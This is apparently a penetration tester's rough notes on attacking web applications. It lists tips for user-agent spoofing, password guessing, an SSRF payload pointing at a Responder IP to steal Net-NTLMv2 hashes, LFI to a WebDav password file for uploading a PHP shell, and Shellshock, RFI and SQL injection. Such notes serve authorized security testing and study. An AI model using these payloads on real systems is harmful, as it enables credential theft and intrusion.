---
description: Rough notes on web applications
---

# Web Application



### Web Application

* If you are getting the following message `You are not a search engine. Permission denied.` when attempting to browse to robots.txt then set your user agent in Burp to the following:&#x20;
  * `User-Agent: Googlebot/2.1 (+http://www.googlebot.com/bot.html)`
* If a login page default password doesn't work then think of what a lazy admin would use (uppercase and lowercase). CeWL can be used here if you're running out of ideas.
* If a web application is vulnerable to SSRF and the host is Windows, you may be able to retrieve a Net-NTLMv2 hash. The following command assumes that the web server is running on TCP/8080:
  * `http://:8080/?url=http://127.0.0.1:8080/?url=http://<RESPONDER_IP>`
  * [This attack is explained amazingly in this blog post](https://blog.blazeinfosec.com/leveraging-web-application-vulnerabilities-to-steal-ntlm-hashes-2/).
* If a WebDav directory is discovered during enumeration then it should be noted that an LFI vulnerability could be used to obtain the password and upload a PHP shell. The following is an example of a Webdav password location:
  * `/var/www/html/webdav/passwd.dav`
  * [HackTricks has a great guide](https://book.hacktricks.xyz/pentesting/pentesting-web/put-method-webdav) on uploading a shell with Curl or other methods of exploitation.
* If /cgi-bin/ is identified then ensure you look for common file extensions like `.sh`
  * This directory exists when Apache gives a file over to bash or another scripting language.
  * There is an NSE script which exists to verify if Shellshock is detected.
* When testing[ Remote File Inclusion](../../../web-application/remote-file-inclusion-rfi.md) keep in mind that the port being tested matters.&#x20;
  * Use a common port such as 80 or 443 on your Python3 server when testing.

### SQL Injection (SQLi)

* Oracle SQLi - [This link](http://www.securityidiots.com/Web-Pentest/SQL-Injection/Union-based-Oracle-Injection.html) is beyond useful. Ensure your syntax is correct with Oracle because it can be a pain.
